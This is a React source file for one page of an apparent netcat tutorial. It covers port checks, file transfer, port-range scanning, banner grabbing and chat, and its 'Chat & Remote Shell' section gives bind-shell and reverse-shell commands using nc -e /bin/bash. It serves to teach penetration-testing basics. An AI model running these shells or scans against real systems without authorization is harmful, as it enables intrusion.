'use client'

import { useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import Callout from '@/components/base/Callout';
import InlineCode from '@/components/base/InlineCode';
import CodeBlock from '@/components/base/Codeblock';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const exampleCategories = [
  {
    title: 'Basic Connection Examples',
    examples: [
      {
        title: 'Connect to a remote SSH server',
        cmd: 'nc -v 10.0.0.1 22',
        desc: 'Connects to port 22 (SSH) and displays the banner. Use -vv for extra verbosity.',
      },
      {
        title: 'Simple TCP connection test',
        cmd: 'nc -z -v 10.0.0.1 80',
        desc: 'The -z flag sends no data and exits after connection is established. Perfect for port scanning or checking if a service is alive.',
      },
      {
        title: 'UDP port check',
        cmd: 'nc -z -u -v 10.0.0.1 53',
        desc: 'Checks if UDP port 53 (DNS) is open. UDP does not guarantee response delivery; -z returns immediately after sending.',
      },
    ],
  },
  {
    title: 'File Transfer',
    examples: [
      {
        title: 'Send a file from client to server',
        cmd: 'nc -w 3 10.0.0.1 4444 < secret.txt',
        desc: 'Client sends secret.txt to listening server on port 4444. -w 3 sets a 3-second timeout.',
      },
      {
        title: 'Receive a file on the server',
        cmd: 'nc -l -p 4444 > received.txt',
        desc: 'Listener saves incoming data to received.txt. Start listener first, then run the client.',
      },
      {
        title: 'Transfer an entire directory (tar + nc)',
        cmd: 'tar -czf - /path/to/dir | nc 10.0.0.1 4444',
        desc: 'Compresses and streams a directory over netcat. On the receiving end: nc -l -p 4444 | tar -xzf -',
      },
    ],
  },
  {
    title: 'Port Scanning',
    examples: [
      {
        title: 'Scan single port',
        cmd: 'nc -z -v 10.0.0.1 443',
        desc: 'Quick check if port 443 is open on 10.0.0.1. Returns whether the connection succeeded.',
      },
      {
        title: 'Scan port range',
        cmd: 'for port in {1..100}; do nc -z -w 1 -v 10.0.0.1 $port 2>&1 | grep succeeded; done',
        desc: 'Iterates ports 1–100 and prints only those that connect. Adjust range for your target.',
      },
      {
        title: 'Scan common ports',
        cmd: 'for p in 21 22 23 25 53 80 110 143 443 3306; do nc -z -w 1 10.0.0.1 $p && echo "Port $p open"; done',
        desc: 'Tests a curated list of common service ports. Faster than scanning 65535 ports.',
      },
    ],
  },
  {
    title: 'Banner Grabbing',
    examples: [
      {
        title: 'Grab SSH banner',
        cmd: 'nc -nv 10.0.0.1 22',
        desc: 'Connects to SSH port and reads the service banner. Reveals OpenSSH version.',
      },
      {
        title: 'Grab HTTP banner after sending HEAD',
        cmd: 'echo -e "HEAD / HTTP/1.1\\r\\nHost: 10.0.0.1\\r\\n\\r\\n" | nc 10.0.0.1 80',
        desc: 'Some HTTP servers do not send a banner on connect. This HEAD request forces a response with the Server header.',
      },
    ],
  },
  {
    title: 'Chat & Remote Shell',
    examples: [
      {
        title: 'Two-person chat (listener)',
        cmd: 'nc -l -p 4444',
        desc: 'Start a simple chat server on port 4444. Another user connects with nc 10.0.0.1 4444.',
      },
      {
        title: 'Two-person chat (client)',
        cmd: 'nc 10.0.0.1 4444',
        desc: 'Connect to a listening netcat chat server. Everything typed is sent to the other side.',
      },
      {
        title: 'Bind shell (listener on target)',
        cmd: 'nc -l -p 4444 -e /bin/bash',
        desc: 'Target listens and executes bash for any connecting client. Classic bind shell (not available in OpenBSD nc).',
      },
      {
        title: 'Reverse shell (target connects to you)',
        cmd: 'nc 10.0.0.1 4444 -e /bin/bash',
        desc: 'Target connects to your IP and gives you a bash shell. Use when target is behind NAT/firewall.',
      },
    ],
  },
  {
    title: 'Advanced & Miscellaneous',
    examples: [
      {
        title: 'Proxy connection (socks5 via ncat)',
        cmd: 'ncat --proxy 10.0.0.1:1080 --proxy-type socks5 target.com 80',
        desc: 'Routes traffic through a SOCKS5 proxy. Requires ncat, not classic netcat.',
      },
      {
        title: 'Encrypted chat with SSL (ncat)',
        cmd: 'ncat --ssl -l -p 4444',
        desc: 'Listener with SSL encryption. Client connects with: ncat --ssl 10.0.0.1 4444',
      },
      {
        title: 'Web server test (send HTTP request)',
        cmd: 'printf "GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n" | nc example.com 80',
        desc: 'Manually send a raw HTTP request and view the raw response. Useful for debugging.',
      },
    ],
  },
];

export default function NetcatExamplesPage() {
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-medium font-mono mb-4">
          <i className="ri-file-list-line" />
          Netcat Section 8 of 14
        </div>
        <DocHeading level={1}>Usage Examples</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3 text-lg">
          Real-world netcat commands for port checks, file transfers, banner grabbing, chat, and remote shells. Each example includes the exact command and guidance on when to use it.
        </p>
      </motion.div>

      {exampleCategories.map((cat) => (
        <motion.section key={cat.title} className="mt-12" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
          <DocHeading level={2}>{cat.title}</DocHeading>
          <div className="mt-4 space-y-5">
            {cat.examples.map((ex, i) => (
              <div key={i} className="cyber-card p-5">
                <h3 className="text-sm font-semibold text-white mb-2">{ex.title}</h3>
                <CodeBlock code={ex.cmd} />
                <p className="text-xs text-cyber-text leading-relaxed mt-3">{ex.desc}</p>
              </div>
            ))}
          </div>
        </motion.section>
      ))}

      {/* Tips */}
      <motion.section className="mt-12 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <Callout type="danger">
          Most netcat shell examples require a listener on the attacker side. Ensure your listener IP is reachable from the target and that you have explicit authorization for the engagement.
        </Callout>

        <div className="mt-8 flex gap-3">
          <a href="/netcat/command-builder" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            Next: Command Builder <i className="ri-arrow-right-line ml-1" />
          </a>
          <a href="/netcat/flags" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-amber hover:text-cyber-amber transition-all whitespace-nowrap">
            <i className="ri-arrow-left-line mr-1" /> Back
          </a>
        </div>
      </motion.section>
    </div>
  );
}
